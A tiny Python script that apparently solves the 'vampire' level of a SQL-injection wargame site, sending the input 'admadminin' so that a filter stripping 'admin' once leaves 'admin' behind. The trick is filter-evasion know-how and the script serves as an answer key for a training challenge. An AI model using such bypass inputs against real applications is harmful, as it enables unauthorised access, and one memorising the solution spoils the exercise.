from constants import *

chall_url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php"

res = make_request(chall_url, "?id=admadminin")
check_clear(res)
